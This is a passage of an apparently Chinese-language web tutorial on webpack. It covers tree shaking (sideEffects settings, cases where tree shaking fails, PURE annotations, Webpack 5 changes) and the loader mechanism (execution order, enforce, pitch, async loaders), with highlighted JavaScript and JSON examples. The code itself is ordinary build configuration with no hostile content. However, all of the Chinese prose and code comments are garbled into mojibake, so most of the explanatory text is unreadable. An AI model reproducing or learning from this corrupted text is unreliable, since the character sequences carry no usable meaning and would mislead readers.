‡è®°ä¾èµ–</li><li>SideEffectsFlagï¼šå¤„ç†å‰¯ä½œç”¨</li><li>MangleExportsï¼šæ··æ·†å¯¼å‡ºåç§°</li><li>InnerGraphï¼šå†…éƒ¨ä¾èµ–åˆ†æï¼ˆWebpack 5ï¼‰</li></ul><p><strong>sideEffects å®æˆ˜é…ç½®æŒ‡å—</strong></p><p>(1) åº“å¼€å‘è€…é…ç½®</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs JSON"><span class="hljs-comment">// ç»„ä»¶åº“çš„package.json</span><br><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;sideEffects&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>    <span class="hljs-string">&quot;**/*.css&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-string">&quot;**/*.scss&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-string">&quot;esm/index.js&quot;</span><span class="hljs-punctuation">,</span>    <span class="hljs-comment">// å…¥å£æ–‡ä»¶å¯èƒ½æœ‰å‰¯ä½œç”¨</span><br>    <span class="hljs-string">&quot;src/setupTests.js&quot;</span><br>  <span class="hljs-punctuation">]</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>(2) åº”ç”¨å¼€å‘è€…é…ç½®</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// webpack.config.js</span><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123;<br>  <span class="hljs-attr">mode</span>: <span class="hljs-string">&#x27;production&#x27;</span>,<br>  <span class="hljs-attr">optimization</span>: &#123;<br>    <span class="hljs-attr">usedExports</span>: <span class="hljs-literal">true</span>,   <span class="hljs-comment">// å¯ç”¨æ ‡è®°</span><br>    <span class="hljs-attr">sideEffects</span>: <span class="hljs-literal">true</span>,   <span class="hljs-comment">// å¯ç”¨å‰¯ä½œç”¨åˆ†æ</span><br>    <span class="hljs-attr">minimize</span>: <span class="hljs-literal">true</span>,      <span class="hljs-comment">// å¯ç”¨ä»£ç å‹ç¼©</span><br>    <span class="hljs-attr">innerGraph</span>: <span class="hljs-literal">true</span>     <span class="hljs-comment">// å¯ç”¨æ·±åº¦åˆ†æï¼ˆWebpack 5ï¼‰</span><br>  &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><p><strong>Tree Shaking å¤±æ•ˆåœºæ™¯åˆ†æ</strong></p><table><thead><tr><th align="left">å¤±æ•ˆåœºæ™¯</th><th align="left">åŸå› åˆ†æ</th><th align="left">è§£å†³æ–¹æ¡ˆ</th></tr></thead><tbody><tr><td align="left">Babel è½¬è¯‘ESM</td><td align="left">è½¬ä¸ºCJSä¸¢å¤±é™æ€ç‰¹æ€§</td><td align="left">ä¿ç•™ESMè¯­æ³•</td></tr><tr><td align="left">åŠ¨æ€å¯¼å…¥æ¨¡å¼</td><td align="left">import()éé™æ€åˆ†æ</td><td align="left">é‡æ„ä¸ºé™æ€å¯¼å…¥</td></tr><tr><td align="left">å‰¯ä½œç”¨æ¨¡å—æœªå£°æ˜</td><td align="left">CSSæ–‡ä»¶æœªå£°æ˜å‰¯ä½œç”¨</td><td align="left">æ­£ç¡®é…ç½®sideEffects</td></tr><tr><td align="left">å¯¹è±¡å±æ€§è®¿é—®</td><td align="left"><code>obj[dynamicKey]</code></td><td align="left">ä½¿ç”¨çº¯å‡½æ•°é‡æ„</td></tr><tr><td align="left">æ¨¡å—å†å¯¼å‡º</td><td align="left"><code>export * from &#39;./utils&#39;</code></td><td align="left">ä½¿ç”¨å‘½åå¯¼å‡ºexport { func }</td></tr></tbody></table><p>ç‰¹æ®Šæ¡ˆä¾‹ï¼šç¬¬ä¸‰æ–¹åº“ä¼˜åŒ–</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// ä¼˜åŒ–lodashå¯¼å…¥</span><br><span class="hljs-keyword">import</span> &#123; debounce &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;lodash-es&#x27;</span>; <span class="hljs-comment">// æ­£ç¡®</span><br><span class="hljs-keyword">import</span> _ <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;lodash&#x27;</span>;               <span class="hljs-comment">// é”™è¯¯ï¼ˆæ•´ä¸ªåŒ…è¢«å¼•å…¥ï¼‰</span><br>_.<span class="hljs-title function_">debounce</span>();                         <span class="hljs-comment">// Tree Shakingå¤±æ•ˆ</span><br></code></pre></td></tr></table></figure><p><strong>é«˜çº§ä¼˜åŒ–ç­–ç•¥</strong></p><p>(1) ä½œç”¨åŸŸæå‡ï¼ˆScope Hoistingï¼‰</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// ä¼˜åŒ–å‰</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> a = <span class="hljs-number">1</span>;<br><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> b = <span class="hljs-number">2</span>;<br><br><span class="hljs-comment">// ä¼˜åŒ–å</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> a = <span class="hljs-number">1</span>, b = <span class="hljs-number">2</span>; <span class="hljs-comment">// å‡å°‘æ¨¡å—å°è£…ä»£ç </span><br></code></pre></td></tr></table></figure><p>(2) çº¯æ³¨è§£æ ‡è®°</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">/*#__PURE__*/</span> <br><span class="hljs-keyword">const</span> element = <span class="hljs-title function_">createElement</span>(); <span class="hljs-comment">// æ˜ç¡®æ ‡è®°æ— å‰¯ä½œç”¨</span><br><br><span class="hljs-comment">// æˆ–ä½¿ç”¨JSDoc</span><br><span class="hljs-comment">/** @__PURE__ */</span><br><span class="hljs-keyword">const</span> instance = <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyClass</span>();<br></code></pre></td></tr></table></figure><p><strong>é¢è¯•é‡ç‚¹è§£æ</strong></p><p>(1) ä¸ºä»€ä¹ˆCSSéœ€è¦ç‰¹æ®Šå¤„ç†ï¼Ÿ</p><ol><li>CSSå¯¼å…¥è¯­æ³•ï¼š<code>import &#39;./styles.css&#39;</code></li><li>æ²¡æœ‰æ˜¾å¼å¯¼å‡ºå˜é‡</li><li>Webpackæ— æ³•åˆ¤æ–­æ˜¯å¦è¢«ä½¿ç”¨</li><li>éœ€é€šè¿‡<code>sideEffects</code>æ˜¾å¼å£°æ˜ï¼šâ€sideEffectsâ€: [â€œ*.cssâ€]</li></ol><p>(2) å¦‚ä½•éªŒè¯Tree Shakingç”Ÿæ•ˆï¼Ÿ</p><p>éªŒè¯æ­¥éª¤ï¼š</p><ul><li>æ·»åŠ æµ‹è¯•å¯¼å‡ºå‡½æ•°</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// utils.js</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">used</span>(<span class="hljs-params"></span>) &#123; <span class="hljs-comment">/*...*/</span> &#125;<br><span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">unused</span>(<span class="hljs-params"></span>) &#123; <span class="hljs-comment">/*...*/</span> &#125;<br></code></pre></td></tr></table></figure><ul><li>åªå¯¼å…¥ä½¿ç”¨å‡½æ•°</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">import</span> &#123; used &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./utils&#x27;</span>;<br></code></pre></td></tr></table></figure><ul><li>æ£€æŸ¥è¾“å‡ºbundleï¼š<ul><li>æœç´¢ unused å‡½æ•°æ˜¯å¦å­˜åœ¨</li><li>ä½¿ç”¨Webpackåˆ†æå·¥å…·éªŒè¯</li></ul></li></ul><p>(3) Webpack 5çš„Tree Shakingæ”¹è¿›ï¼Ÿ</p><p>æ ¸å¿ƒæ”¹è¿›ï¼š</p><ul><li>Nested Tree Shakingï¼šåµŒå¥—å¯¼å‡ºåˆ†æ</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> nested = &#123;<br>  <span class="hljs-attr">a</span>: <span class="hljs-number">1</span>,<br>  <span class="hljs-attr">b</span>: <span class="hljs-number">2</span><br>&#125;<br><span class="hljs-comment">// ä»…ä½¿ç”¨nested.aæ—¶åˆ é™¤bå±æ€§</span><br></code></pre></td></tr></table></figure><ul><li>Inner Graphï¼šå†…éƒ¨ä¾èµ–è¿½è¸ª</li><li>CommonJS Tree Shakingï¼šåŸºç¡€CJSæ”¯æŒ</li><li>æ·±åº¦ä½œç”¨åŸŸåˆ†æï¼šå˜é‡çº§åˆ é™¤</li></ul><h1 id="äºŒã€æ ¸å¿ƒç¼–è¯‘æµç¨‹ä¸æ‰©å±•"><a href="#äºŒã€æ ¸å¿ƒç¼–è¯‘æµç¨‹ä¸æ‰©å±•" class="headerlink" title="äºŒã€æ ¸å¿ƒç¼–è¯‘æµç¨‹ä¸æ‰©å±•"></a>äºŒã€æ ¸å¿ƒç¼–è¯‘æµç¨‹ä¸æ‰©å±•</h1><h2 id="2-1-Loaderæœºåˆ¶"><a href="#2-1-Loaderæœºåˆ¶" class="headerlink" title="2.1 Loaderæœºåˆ¶"></a>2.1 Loaderæœºåˆ¶</h2><h3 id="2-1-1-é“¾å¼è°ƒç”¨ä¸æ‰§è¡Œé¡ºåº"><a href="#2-1-1-é“¾å¼è°ƒç”¨ä¸æ‰§è¡Œé¡ºåº" class="headerlink" title="2.1.1 é“¾å¼è°ƒç”¨ä¸æ‰§è¡Œé¡ºåº"></a>2.1.1 é“¾å¼è°ƒç”¨ä¸æ‰§è¡Œé¡ºåº</h3><p><strong>Loader çš„æœ¬è´¨</strong></p><p>Loaderæœ¬è´¨ä¸Šæ˜¯å¯¼å‡ºä¸ºå‡½æ•°çš„JavaScriptæ¨¡å—ï¼Œwebpackå†…éƒ¨çš„loader runnerä¼šè°ƒç”¨è¯¥å‡½æ•°ï¼Œå¹¶å°†ä¸Šä¸€ä¸ªloaderçš„è¾“å‡ºç»“æœä½œä¸ºå‚æ•°ä¼ ç»™è¯¥å‡½æ•°</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// Loader åŸºæœ¬ç»“æ„</span><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">source, map, meta</span>) &#123;<br>  <span class="hljs-comment">// 1. å¯¹æºä»£ç è¿›è¡Œå¤„ç†</span><br>  <span class="hljs-keyword">const</span> transformed = <span class="hljs-title function_">transform</span>(source);<br>  <br>  <span class="hljs-comment">// 2. è¿”å›å¤„ç†ç»“æœï¼ˆæ”¯æŒå¤šç§æ ¼å¼ï¼‰</span><br>  <span class="hljs-keyword">return</span> transformed; <br>  <br>  <span class="hljs-comment">// æˆ–è¿”å›å¤šä¸ªå€¼</span><br>  <span class="hljs-comment">// this.callback(null, transformed, map, meta);</span><br>&#125;;<br></code></pre></td></tr></table></figure><p><strong>é“¾å¼è°ƒç”¨åŸç†</strong></p><p>æ‰§è¡Œæµç¨‹ç¤ºæ„å›¾ï¼š</p><pre class="mermaid">graph LR  A[æºæ–‡ä»¶] --> B[Loader1]  B --> C[Loader2]  C --> D[Loader3]  D --> E[å¤„ç†ç»“æœ]    subgraph æ‰§è¡Œæ–¹å‘    direction LR    F[ä»å³åˆ°å·¦æ‰§è¡Œ] --> G[ä»ä¸‹åˆ°ä¸Šä¼ é€’]  end</pre><p>æ‰§è¡Œé¡ºåºè§„åˆ™ï¼š</p><table><thead><tr><th align="left">é…ç½®ä½ç½®</th><th align="left">æ‰§è¡Œé¡ºåº</th><th align="left">ç¤ºä¾‹</th></tr></thead><tbody><tr><td align="left">é…ç½®æ•°ç»„æœ€å</td><td align="left">æœ€å…ˆæ‰§è¡Œ</td><td align="left">use: [â€˜style-loaderâ€™]</td></tr><tr><td align="left">é…ç½®æ•°ç»„ä¸­é—´</td><td align="left">ä¸­é—´æ‰§è¡Œ</td><td align="left">use: [â€˜css-loaderâ€™]</td></tr><tr><td align="left">é…ç½®æ•°ç»„æœ€å‰</td><td align="left">æœ€åæ‰§è¡Œ</td><td align="left">use: [â€˜sass-loaderâ€™]</td></tr></tbody></table><p>**å®Œæ•´æ‰§è¡Œæµç¨‹åˆ†æ</p><p>(1) æ–‡ä»¶å¤„ç†æµç¨‹</p><pre class="mermaid">graph TB  A[æºæ–‡ä»¶] --> B[Sass-loader]  B --> |1.ç¼–è¯‘SCSS| C[CSS-loader]  C --> |"2.å¤„ç†@import/url"| D[PostCSS-loader]  D --> |3.è‡ªåŠ¨æ·»åŠ å‰ç¼€| E[Style-loader]  E --> |4.æ³¨å…¥DOM| F[æœ€ç»ˆJSè¾“å‡º]</pre><p>(2) æ•°æ®ä¼ é€’æœºåˆ¶</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// ç¤ºä¾‹ï¼šSCSSæ–‡ä»¶å¤„ç†æµç¨‹</span><br><span class="hljs-comment">// åŸå§‹æ•°æ®æµ</span><br>sass-<span class="hljs-title function_">loader</span>(scss) â†’ css-<span class="hljs-title function_">loader</span>(css) â†’ postcss-<span class="hljs-title function_">loader</span>(css) â†’ style-<span class="hljs-title function_">loader</span>(js)<br><br><span class="hljs-comment">// å„é˜¶æ®µè¾“å‡ºï¼š</span><br><span class="hljs-comment">// sass-loader: CSSæ–‡æœ¬</span><br><span class="hljs-comment">// css-loader: JSæ¨¡å—ä»£ç </span><br><span class="hljs-comment">// postcss-loader: ä¼˜åŒ–åçš„CSSæ–‡æœ¬</span><br><span class="hljs-comment">// style-loader: å¸¦DOMæ“ä½œçš„JSä»£ç </span><br></code></pre></td></tr></table></figure><p><strong>æ§åˆ¶æ‰§è¡Œé¡ºåºçš„æŠ€å·§</strong></p><p>(1) é…ç½®ä¼˜å…ˆçº§</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// webpack.config.js</span><br><span class="hljs-attr">module</span>: &#123;<br>  <span class="hljs-attr">rules</span>: [<br>    &#123;<br>      <span class="hljs-attr">test</span>: <span class="hljs-regexp">/\.scss$/</span>,<br>      <span class="hljs-attr">use</span>: [<br>        <span class="hljs-string">&#x27;style-loader&#x27;</span>,  <span class="hljs-comment">// æœ€åæ‰§è¡Œï¼ˆæœ€å…ˆæ”¾å…¥æ•°ç»„ï¼‰</span><br>        &#123;<br>          <span class="hljs-attr">loader</span>: <span class="hljs-string">&#x27;css-loader&#x27;</span>,<br>          <span class="hljs-attr">options</span>: &#123; <span class="hljs-attr">importLoaders</span>: <span class="hljs-number">2</span> &#125; <span class="hljs-comment">// å£°æ˜å‰ç½®loaderæ•°é‡</span><br>        &#125;,<br>        <span class="hljs-string">&#x27;postcss-loader&#x27;</span>, <span class="hljs-comment">// ä¸­é—´æ‰§è¡Œ</span><br>        <span class="hljs-string">&#x27;sass-loader&#x27;</span>     <span class="hljs-comment">// æœ€å…ˆæ‰§è¡Œï¼ˆæœ€åæ”¾å…¥æ•°ç»„ï¼‰</span><br>      ]<br>    &#125;<br>  ]<br>&#125;<br></code></pre></td></tr></table></figure><p>(2) ä½¿ç”¨ enforce å¼ºåˆ¶æ’åº</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-attr">rules</span>: [<br>  &#123;<br>    <span class="hljs-attr">test</span>: <span class="hljs-regexp">/\.js$/</span>,<br>    <span class="hljs-attr">loader</span>: <span class="hljs-string">&#x27;eslint-loader&#x27;</span>,<br>    <span class="hljs-attr">enforce</span>: <span class="hljs-string">&#x27;pre&#x27;</span>, <span class="hljs-comment">// å¼ºåˆ¶æœ€å…ˆæ‰§è¡Œ</span><br>  &#125;,<br>  &#123;<br>    <span class="hljs-attr">test</span>: <span class="hljs-regexp">/\.js$/</span>,<br>    <span class="hljs-attr">loader</span>: <span class="hljs-string">&#x27;babel-loader&#x27;</span> <span class="hljs-comment">// é»˜è®¤é¡ºåº</span><br>  &#125;,<br>  &#123;<br>    <span class="hljs-attr">test</span>: <span class="hljs-regexp">/\.css$/</span>,<br>    <span class="hljs-attr">loader</span>: <span class="hljs-string">&#x27;style-loader&#x27;</span>, <br>    <span class="hljs-attr">enforce</span>: <span class="hljs-string">&#x27;post&#x27;</span> <span class="hljs-comment">// å¼ºåˆ¶æœ€åæ‰§è¡Œ</span><br>  &#125;<br>]<br></code></pre></td></tr></table></figure><p>(3) Loader Pitch</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">//æ¯ä¸ª Loader å¯å®šä¹‰ä¸€ä¸ª pitch æ–¹æ³•ï¼ŒWebpack åœ¨çœŸæ­£å¤„ç†æ¨¡å—å†…å®¹å‰ä¼šä»å·¦å‘å³æ‰§è¡Œæ‰€æœ‰ Loader çš„ pitch å‡½æ•°</span><br><span class="hljs-comment">// å½“æŸä¸ª Loader çš„ pitch å‡½æ•°è¿”å›é undefined å€¼æ—¶ï¼Œä¼šè§¦å‘ç†”æ–­æ•ˆæœï¼š</span><br><span class="hljs-comment">// 1.è·³è¿‡åç»­æ‰€æœ‰ Loader çš„ pitch å’Œæ­£å¸¸æ‰§è¡Œ</span><br><span class="hljs-comment">// 2.ç›´æ¥è¿”å›å½“å‰ pitch çš„ç»“æœä½œä¸ºæ¨¡å—å†…å®¹</span><br><span class="hljs-comment">// loaderB.js</span><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span>.<span class="hljs-property">pitch</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;console.log(&quot;Skipped by B pitch!&quot;);&#x27;</span>; <span class="hljs-comment">// è¿”å›å­—ç¬¦ä¸²</span><br>&#125;;<br><br><span class="hljs-comment">// æ‰§è¡Œæµç¨‹ï¼š</span><br><span class="hljs-comment">//   Pitch A â†’ Pitch B (è¿”å›ç»“æœ) â†’ è·³è¿‡ Pitch C å’Œæ‰€æœ‰ Loader æ‰§è¡Œ</span><br><span class="hljs-comment">//   â†“</span><br><span class="hljs-comment">//   Webpack ç›´æ¥å°†è¿”å›çš„å­—ç¬¦ä¸²ä½œä¸ºæ¨¡å—æºç </span><br></code></pre></td></tr></table></figure><p><strong>ç‰¹æ®Šåœºæ™¯å¤„ç†</strong></p><p>(1) å‰ç½®ä¾èµ–å¤„ç†ï¼ˆimportLoadersï¼‰</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// CSSä¸­å¼•ç”¨å…¶ä»–èµ„æº</span><br><span class="hljs-comment">/* index.css */</span><br>@<span class="hljs-keyword">import</span> <span class="hljs-string">&#x27;./reset.css&#x27;</span>; <span class="hljs-comment">// éœ€è¦é‡æ–°èµ°loaderæµç¨‹</span><br><br><span class="hljs-comment">// é…ç½®ä¿è¯@importæ­£ç¡®å¤„ç†</span><br>&#123;<br>  <span class="hljs-attr">loader</span>: <span class="hljs-string">&#x27;css-loader&#x27;</span>,<br>  <span class="hljs-attr">options</span>: &#123;<br>    <span class="hljs-attr">importLoaders</span>: <span class="hljs-number">2</span> <span class="hljs-comment">// æŒ‡å®šå‰ç½®2ä¸ªloader</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>Loader æ‰§è¡Œä¸Šä¸‹æ–‡</strong></p><p>(1) å…³é”®ä¸Šä¸‹æ–‡å±æ€§</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">source</span>) &#123;<br>  <span class="hljs-comment">// 1. è·å–é…ç½®é€‰é¡¹</span><br>  <span class="hljs-keyword">const</span> options = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getOptions</span>();<br>  <br>  <span class="hljs-comment">// 2. å¼‚æ­¥å›è°ƒå¤„ç†</span><br>  <span class="hljs-keyword">const</span> callback = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">async</span>();<br>  <br>  <span class="hljs-comment">// 3. èµ„æºè·¯å¾„ä¿¡æ¯</span><br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">resourcePath</span>); <span class="hljs-comment">// å®Œæ•´æ–‡ä»¶è·¯å¾„</span><br>  <br>  <span class="hljs-comment">// 4. æ·»åŠ ä¾èµ–ç›‘è§†</span><br>  <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">addDependency</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">resourcePath</span> + <span class="hljs-string">&#x27;.map&#x27;</span>);<br>  <br>  <span class="hljs-comment">// 5. ç¼“å­˜å¯ç”¨</span><br>  <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">cacheable</span>) <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">cacheable</span>();<br>&#125;<br></code></pre></td></tr></table></figure><p>(2) å¼‚æ­¥Loaderæ¨¡å¼</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// å¼‚æ­¥Loaderç¤ºä¾‹</span><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">source</span>) &#123;<br>  <span class="hljs-keyword">const</span> callback = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">async</span>();<br>  <br>  <span class="hljs-comment">// æ¨¡æ‹Ÿå¼‚æ­¥æ“ä½œ</span><br>  <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-title function_">callback</span>(<span class="hljs-literal">null</span>, source.<span class="hljs-title function_">replace</span>(<span class="hljs-string">&#x27;foo&#x27;</span>, <span class="hljs-string">&#x27;bar&#x27;</span>));<br>  &#125;, <span class="hljs-number">100</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>æ€§èƒ½ä¼˜åŒ–å®è·µ</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// é¿å…ä¸å¿…è¦çš„Loaderå¤„ç†</span><br>&#123;<br>  <span class="hljs-attr">test</span>: <span class="hljs-regexp">/\.js$/</span>,<br>  <span class="hljs-attr">exclude</span>: <span class="hljs-regexp">/node_modules/</span>,<br>  <span class="hljs-attr">use</span>: [<br>    &#123;<br>      <span class="hljs-attr">loader</span>: <span class="hljs-string">&#x27;babel-loader&#x27;</span>,<br>      <span class="hljs-attr">options</span>: &#123;<br>        <span class="hljs-attr">cacheDirectory</span>: <span class="hljs-literal">true</span> <span class="hljs-comment">// å¯ç”¨ç¼“å­˜</span><br>      &#125;<br>    &#125;<br>  ]<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>å¸¸è§é—®é¢˜è§£å†³æ–¹æ¡ˆ</strong></p><p>(1) Loaderæ‰§è¡Œé¡ºåºé”™è¯¯</p><p>ç—‡çŠ¶ï¼šæ ·å¼æœªæ­£ç¡®åº”ç”¨</p><p>è§£å†³æ–¹æ¡ˆï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// æ­£ç¡®é¡ºåº</span><br><span class="hljs-attr">use</span>: [<br>  <span class="hljs-title class_">MiniCssExtractPlugin</span>.<span class="hljs-property">loader</span>, <span class="hljs-comment">// æ›¿ä»£style-loader</span><br>  &#123;<br>    <span class="hljs-attr">loader</span>: <span class="hljs-string">&#x27;css-loader&#x27;</span>,<br>    <span class="hljs-attr">options</span>: &#123; <span class="hljs-attr">importLoaders</span>: <span class="hljs-number">1</span> &#125;<br>  &#125;,<br>  <span class="hljs-string">&#x27;postcss-loader&#x27;</span> <span class="hljs-comment">// å…ˆäºcss-loaderæ‰§è¡Œ</span><br>]<br></code></pre></td></tr></table></figure><p>(2) Loaderæœªç”Ÿæ•ˆ</p><p>æ’æŸ¥æ­¥éª¤ï¼š</p><ul><li>æ£€æŸ¥Loaderæ˜¯å¦é…ç½®åˆ°æ­£ç¡®è§„åˆ™</li><li>éªŒè¯æ–‡ä»¶è·¯å¾„æ˜¯å¦åŒ¹é…testæ­£åˆ™</li><li>æ£€æŸ¥Loaderæ˜¯å¦æ”¯æŒè¾“å…¥æ ¼å¼</li><li>åœ¨Loaderå‡½æ•°ä¸­æ·»åŠ æ—¥å¿—è°ƒè¯•</li></ul><p><strong>Loaderè®¾è®¡åŸåˆ™</strong></p><p>(1) å•ä¸€èŒè´£åŸåˆ™</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// é¿å…</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">allInOneLoader</span>(<span class="hljs-params">source</span>) &#123;<br>  <span class="hljs-comment">// å¤„ç†TypeScript + SCSS + å‹ç¼©...</span><br>&#125;<br><br><span class="hljs-comment">// 